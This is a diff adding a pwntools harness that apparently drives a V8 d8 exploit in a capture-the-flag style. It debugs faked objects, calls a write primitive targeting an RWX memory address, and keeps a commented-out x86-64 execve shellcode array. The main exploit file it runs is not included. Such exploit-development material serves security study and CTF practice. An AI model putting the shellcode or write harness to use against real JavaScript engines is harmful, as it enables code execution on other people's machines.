@@ -1,0 +1,46 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+import time
+warnings.filterwarnings("ignore")
+libc = ELF("./libc.so.6")
+# a = time.time()
+# exe = ELF("./d8",checksec=False)
+# b = time.time()
+# print(f"time take: {b-a}")
+# context.log_level='debug'
+# p = remote("addr", 1337)
+p = process(["./d8","--allow-natives-syntax","--shell", "a.js"])
+def gdbs():
+    context.terminal = ["foot"]
+    gdb.attach(p, gdbscript="""
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+gdbs()
+# sl("a = ['aaa','bbb','ccc','ddd']")
+# sl("print(\"\\ndebug PACKED_DOUBLE_ELEMENTS: \");%DebugPrint(flt);")
+# sl("print(\"\\ndebug PACKED_ELEMENTS: \");%DebugPrint(c);")
+# sl("print(\"\\ndebug fake: \");%DebugPrint(fake);")
+sl("print(\"\\n\\033[33mdebug fake2:\\033[0m \");%DebugPrint(fake2);")
+sl("print(\"\\n\\033[33mdebug float_arr:\\033[0m \");%DebugPrint(float_arr);")
+# sl("""var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];""")
+sl("wrivar(align(write_next),align(rwx_addr))")
+
+# sl("print(\"\\n\\033[33mdebug flt:\\033[0m \");%DebugPrint(flt);")
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
